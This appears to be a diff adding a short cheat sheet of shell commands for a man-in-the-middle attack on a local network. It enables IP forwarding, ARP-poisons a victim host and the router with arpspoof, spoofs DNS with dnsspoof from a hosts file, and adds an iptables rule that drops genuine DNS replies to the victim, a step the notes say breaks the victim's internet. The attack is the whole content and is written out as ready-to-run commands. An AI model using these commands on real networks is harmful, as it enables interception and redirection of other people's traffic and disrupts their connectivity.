@@ -1,0 +1,38 @@
+## Open wireshark and start sniffing
+
+
+## Forward packages not for you
+echo "1" > /proc/sys/net/ipv4/ip_forward
+
+
+## Verify
+cat /proc/sys/net/ipv4/ip_forward
+
+
+## Reconfigure the kernel parameters at runtime
+sysctl -p
+
+## See the victims arp table and notice the routers Mac Adresse
+arp -a
+
+
+## Start the arp poisoning of the client (the first IP is allways the victim)
+arpspoof -i eth0 -t 192.168.242.22 192.168.242.2
+
+
+##Start the arp poisoning of the router (the first IP is allways the victim)
+arpspoof -i eth0 -t 192.168.242.2 192.168.242.22
+
+
+## Take a look in wireshark and see all the arp packages afterwards filter for DNS
+
+
+## Start the DNS spoof
+dnsspoof -f /root/Desktop/hosts
+
+## You might have to drop the request from the real DNS server
+## (This destroys the internet for the victim)
+
+iptables -A FORWARD -p udp --source-port 53 -d 192.168.242.21 -j DROP
+
+
